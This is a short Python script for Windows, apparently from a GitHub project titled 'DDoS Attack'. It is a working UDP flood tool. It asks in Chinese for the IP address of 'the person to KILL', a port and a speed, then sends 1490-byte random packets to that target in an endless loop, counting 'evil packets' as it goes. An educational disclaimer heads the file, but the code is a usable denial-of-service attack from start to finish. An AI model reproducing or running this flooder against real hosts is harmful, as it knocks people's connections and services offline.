# python3

# For Windows

##################################################
# github:https://github/CYB140705/DDoS-Attack    #
# by:@CYB140705                                  #
##################################################

"""
网络工具演示程序

免责声明：此程序仅用于教育目的，展示基本的网络概念。
实际使用时应遵守所有适用法律和道德准则。
"""

# Begin Code

import time,os,socket,random,sys

# This is Code time

from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##################
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##################

os.system("cls")
os.system("color a")
os.system("echo                    DDoS Attack")
print (" ")
print ("/---------------------------------------------------\ ")
print ("|   作者          : CYB140705                         |")
print ("|   作者github    : https://github.com/CYB140705      |")
print ("|   版本          : V1.0.0                            |")
print ("|               ！可以转载(转载请标明来源)！          |")
print ("\---------------------------------------------------/")
print (" ")
print (" -----------------[!请勿用于违法用途!]-----------------")
print (" ")

ip = input("请输入要KILL的人的IP地址 (IP查询有教程!在项目根目录里!)          :")
port = int(input("IP的开放端口          :"))
sd = int(input("攻击速度(1~1000)        :"))

os.system("cls")

sent = 0
while True:
    sock.sendto(bytes, (ip,port))
    sent = sent + 1
    print("已发送 %s 个邪恶的数据包到 %s 端口 %d"%(sent,ip,port))
    time.sleep((1000-sd)/2000)